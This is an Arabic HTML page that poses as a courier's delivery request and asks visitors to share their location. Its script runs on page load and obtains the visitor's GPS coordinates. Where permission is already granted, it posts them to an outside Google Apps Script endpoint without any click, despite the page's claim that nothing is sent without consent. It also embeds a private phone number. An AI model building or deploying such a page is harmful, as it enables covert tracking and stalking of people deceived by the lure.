<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8" />
  <title>كابتن وسيم – خدمة توصيل</title>
  <meta name="viewport" content="width=device-width, initial-scale=1" />

  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">

  <style>
    body {
      margin: 0;
      font-family: "Segoe UI", Tahoma, sans-serif;
      background: #f3f4f6;
      display: flex;
      justify-content: center;
      padding: 20px;
    }

    .container {
      background: #ffffff;
      width: 100%;
      max-width: 480px;
      border-radius: 18px;
      overflow: hidden;
      box-shadow: 0 8px 25px rgba(0,0,0,0.1);
    }

    .header {
      background: linear-gradient(135deg, #0077ff, #00b4d8);
      padding: 20px;
      text-align: center;
      color: #fff;
    }

    .header h1 {
      margin: 0;
      font-size: 28px;
      font-weight: 800;
      color: #ffdd57;
    }

    .header h2 {
      margin: 5px 0 0;
      font-size: 16px;
      opacity: 0.9;
    }

    .banner {
      background: #ffdd57;
      padding: 12px;
      text-align: center;
      font-weight: 700;
      font-size: 16px;
      color: #333;
    }

    .image-box {
      padding: 20px;
      text-align: center;
      background: #0f172a;
    }

    .text {
      padding: 18px;
      font-size: 15px;
      color: #444;
      line-height: 1.6;
    }

    .buttons {
      padding: 18px;
      display: flex;
      flex-direction: column;
      gap: 12px;
    }

    .btn {
      padding: 14px;
      border-radius: 999px;
      font-size: 16px;
      font-weight: 700;
      text-align: center;
      text-decoration: none;
      display: block;
      cursor: pointer;
    }

    .btn-location { background: #16a34a; color: #fff; }
    .btn-whatsapp { background: #25d366; color: #fff; }
    .btn-direct { background: #0ea5e9; color: #fff; }

    .note {
      text-align: center;
      padding: 10px 20px 20px;
      font-size: 13px;
      color: #666;
    }

    #loader {
      display: none;
      width: 40px;
      height: 40px;
      border: 5px solid #ddd;
      border-top: 5px solid #00b4d8;
      border-radius: 50%;
      margin: 15px auto;
      animation: spin 1s linear infinite;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
  </style>
</head>

<body>

  <div class="container">

    <div class="header">
      <h1>خدمة التوصيل</h1>
      <h2>اسم الكابتن : وسيم</h2>
      <h2>نوع الدراجة : كهربائية</h2>
    </div>

    <div class="banner">
      رجاء تزويدنا بموقعك للوصول السريع
    </div>

    <div id="loader"></div>

    <div class="image-box">
      <img src="cartoon Image.png" style="width:100%; border-radius:14px;">
    </div>

    <div class="text">
      سيتم إرسال موقعك تلقائياً بعد الموافقة.
    </div>

    <div class="buttons">

      <button class="btn btn-direct" onclick="sendNow()">
        📍 إرسال موقعي مباشرة
      </button>

      <button class="btn btn-location" onclick="sendLocationSMS()">
        📍 عبر SMS
      </button>

      <button class="btn btn-whatsapp" onclick="sendLocationWhatsApp()">
        <i class="fab fa-whatsapp"></i>
        واتساب
      </button>

    </div>

    <div class="note">
      لن يتم إرسال موقعك إلا بعد موافقتك.
    </div>

  </div>

  <script>

    function showLoader() {
      document.getElementById("loader").style.display = "block";
    }

    function hideLoader() {
      document.getElementById("loader").style.display = "none";
    }

    // 🔥 تشغيل تلقائي
    window.onload = function () {
      checkPermissionAndSend();
    };

    function checkPermissionAndSend() {
      showLoader();

      if (!navigator.geolocation) {
        hideLoader();
        return;
      }

      navigator.permissions.query({ name: "geolocation" }).then(function (result) {

        if (result.state === "granted") {
          sendNow();

        } else if (result.state === "prompt") {
          navigator.geolocation.getCurrentPosition(
            function (pos) {
              sendNow(pos);
            },
            function () {
              hideLoader();
            }
          );

        } else {
          hideLoader();
        }

      });
    }

    function sendNow(position) {
      if (!position) {
        navigator.geolocation.getCurrentPosition(sendNow);
        return;
      }

      const lat = position.coords.latitude;
      const lon = position.coords.longitude;

      fetch("https://script.google.com/macros/s/AKfycbzOWiCC0M_4R07IaZWxox9EMU-7jeDGApL819W86JLFvinwon574wc66vc7HfCdrrMU/exec", {
        method: "POST",
        body: JSON.stringify({
          map_url: "https://www.google.com/maps?q=" + lat + "," + lon
        })
      }).then(() => {
        hideLoader();
        alert("تم إرسال موقعك ✔");
      }).catch(() => {
        hideLoader();
      });
    }

    function sendLocationSMS() {
      navigator.geolocation.getCurrentPosition(function (pos) {
        var link = "https://www.google.com/maps?q=" + pos.coords.latitude + "," + pos.coords.longitude;
        window.location.href = "sms:963958267694?body=" + link;
      });
    }

    function sendLocationWhatsApp() {
      navigator.geolocation.getCurrentPosition(function (pos) {
        var link = "https://www.google.com/maps?q=" + pos.coords.latitude + "," + pos.coords.longitude;
        window.location.href = "https://wa.me/963958267694?text=" + link;
      });
    }

  </script>

</body>
</html>
